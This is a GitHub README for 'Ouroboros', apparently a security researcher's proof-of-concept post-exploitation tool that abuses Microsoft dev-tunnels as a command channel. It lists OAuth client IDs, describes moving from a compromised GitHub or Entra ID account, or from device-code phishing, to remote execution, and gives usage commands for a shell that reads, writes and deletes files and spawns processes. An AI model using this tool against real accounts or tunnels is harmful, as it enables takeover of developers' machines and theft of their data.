# https://github.com/xpn/Ouroboros

[Skip to content](https://github.com/xpn/Ouroboros#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/xpn/Ouroboros) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/xpn/Ouroboros) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/xpn/Ouroboros) to refresh your session.Dismiss alert

{{ message }}

master

[**1** Branch](https://github.com/xpn/Ouroboros/branches) [**0** Tags](https://github.com/xpn/Ouroboros/tags)

[Go to Branches page](https://github.com/xpn/Ouroboros/branches)[Go to Tags page](https://github.com/xpn/Ouroboros/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![xpn](https://avatars.githubusercontent.com/u/173764?v=4&size=40)](https://github.com/xpn)[xpn](https://github.com/xpn/Ouroboros/commits?author=xpn)

[initial commit](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199)

5 months agoMay 5, 2026

[63d4596](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199) · 5 months agoMay 5, 2026

## History

[1 Commit](https://github.com/xpn/Ouroboros/commits/master/)

Open commit details

[View commit history for this file.](https://github.com/xpn/Ouroboros/commits/master/) 1 Commit

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [docs](https://github.com/xpn/Ouroboros/tree/master/docs "docs") | [docs](https://github.com/xpn/Ouroboros/tree/master/docs "docs") | [initial commit](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199 "initial commit") | 5 months agoMay 5, 2026 |
| [ouroboros](https://github.com/xpn/Ouroboros/tree/master/ouroboros "ouroboros") | [ouroboros](https://github.com/xpn/Ouroboros/tree/master/ouroboros "ouroboros") | [initial commit](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199 "initial commit") | 5 months agoMay 5, 2026 |
| [patch](https://github.com/xpn/Ouroboros/tree/master/patch "patch") | [patch](https://github.com/xpn/Ouroboros/tree/master/patch "patch") | [initial commit](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199 "initial commit") | 5 months agoMay 5, 2026 |
| [russh](https://github.com/xpn/Ouroboros/tree/master/russh "russh") | [russh](https://github.com/xpn/Ouroboros/tree/master/russh "russh") | [initial commit](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199 "initial commit") | 5 months agoMay 5, 2026 |
| [README.md](https://github.com/xpn/Ouroboros/blob/master/README.md "README.md") | [README.md](https://github.com/xpn/Ouroboros/blob/master/README.md "README.md") | [initial commit](https://github.com/xpn/Ouroboros/commit/63d4596b3f958fbed424ea076eedb9767a8cb199 "initial commit") | 5 months agoMay 5, 2026 |
| View all files |

## Repository files navigation

# Ouroboros

[Permalink: Ouroboros](https://github.com/xpn/Ouroboros#ouroboros)

[![alt text](https://github.com/xpn/Ouroboros/raw/master/docs/logo.png)](https://github.com/xpn/Ouroboros/blob/master/docs/logo.png)

A POC post-exploitation tool which allows connecting and executing commands on a dev-tunnel.

Blog post at: [https://specterops.io/blog/2026/04/30/dev-tunnels-the-accidental-c2/](https://specterops.io/blog/2026/04/30/dev-tunnels-the-accidental-c2/)

## What is it?

[Permalink: What is it?](https://github.com/xpn/Ouroboros#what-is-it)

Microsoft dev-tunnels are used as part of the VSCode Remote Connect functionality, however the protocol supports a number of low-level utility functions.

[![demo](https://github.com/xpn/Ouroboros/raw/master/docs/demo.gif)](https://github.com/xpn/Ouroboros/blob/master/docs/demo.gif)

## What can it be used for?

[Permalink: What can it be used for?](https://github.com/xpn/Ouroboros#what-can-it-be-used-for)

Authentication to dev-tunnels uses one of the following OAuth methods:

- GitHub Account - A client ID of `01ab8ac9400c4e429b23`
- Azure Account - A client ID of `aebc6443-996d-45c2-90f0-388ff96faa56`

### GitHub Post-Exploitation

[Permalink: GitHub Post-Exploitation](https://github.com/xpn/Ouroboros#github-post-exploitation)

If you have compromised a GitHub account, it is possible to enumerate any dev-tunnels associated with that account by authorizing the "Visual Studio Code" OAuth2 application:

[![alt text](https://github.com/xpn/Ouroboros/raw/master/docs/image.png)](https://github.com/xpn/Ouroboros/blob/master/docs/image.png)

This application also allows Device Code registration, meaning that you can go from OAuth2 Device Code Phishing to RCE on any enrolled dev-tunnels.

### Entra-ID Post-Exploitation

[Permalink: Entra-ID Post-Exploitation](https://github.com/xpn/Ouroboros#entra-id-post-exploitation)

There are a few ways to use this for Entra ID connected tunnels.

For FOCI, you can use any Client ID which is part of FOCI and also has the `Dev Tunnels Service` resource available. The one that stands out is `872cd9fa-d31f-45e0-9eab-6e460a02d1f1` (Visual Studio - Legacy).

Alternatively, the Visual Studio Code `aebc6443-996d-45c2-90f0-388ff96faa56` Client ID is used by VSCode to connect users.

# Usage

[Permalink: Usage](https://github.com/xpn/Ouroboros#usage)

To build:

```
cd ouroboros
cargo build
```

# Usage

[Permalink: Usage](https://github.com/xpn/Ouroboros#usage-1)

First you'll need to list out any existing tunnels. You can do this with:

```
./ouroboros management --token [GITHUB/AZURE TOKEN]
```

The list of tunnels returned will look like this:

```
Tunnel List:
Name: sneaky-fog-s5llk1t
        Labels: ["prometheus", "protocolv4", "vscode-server-launcher", "_flag3"]
        Created: "2025-11-03T11:20:51.376614Z"

Name: interesting-horse-lztwqbj
        Labels: ["serenitylocal", "protocolv4", "vscode-server-launcher", "_flag8"]
        Created: "2026-04-13T11:54:57.1330336Z"
```

You can then spawn a virtual shell with:

```
./ouroboros --name interesting-horse-lztwqbj --token [GITHUB/AZURE TOKEN]
```

Several commands are supported:

```
>> help
Available commands:
  help
  gethostname
  get_env
  sys_kill <pid>
  fs_stat <path>
  fs_read <path>
  fs_write <path> <data>
  fs_rm <path>
  fs_mkdirp <path>
  fs_readdir <path>
  fs_rename <from_path> <to_path>
  spawn <command> [args...]
```

# Patching russh

[Permalink: Patching russh](https://github.com/xpn/Ouroboros#patching-russh)

(Not needed as russh is already patched in this repo)...

Because dev-tunnels uses a weird protocol deviation (clients use the forwarded-tcpip channel which is usually for servers), a patch is required to `russh` which lives in `russh.patch`.

This can be applied with:

```
cd russh
git apply ../patch/russh.patch
```

## About

A POC tool for exploring dev-tunnels

[specterops.io/blog/2026/05/06/dev-tunnels-the-accidental-c2/](https://specterops.io/blog/2026/05/06/dev-tunnels-the-accidental-c2/)

### Resources

[Readme](https://github.com/xpn/Ouroboros#readme-ov-file)

[Activity](https://github.com/xpn/Ouroboros/activity)

### Stars

**73** stars

### Watchers

**0** watching

### Forks

[**2** forks](https://github.com/xpn/Ouroboros/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fxpn%2FOuroboros&report=xpn+%28user%29)

## Contributors

## Languages

You can’t perform that action at this time.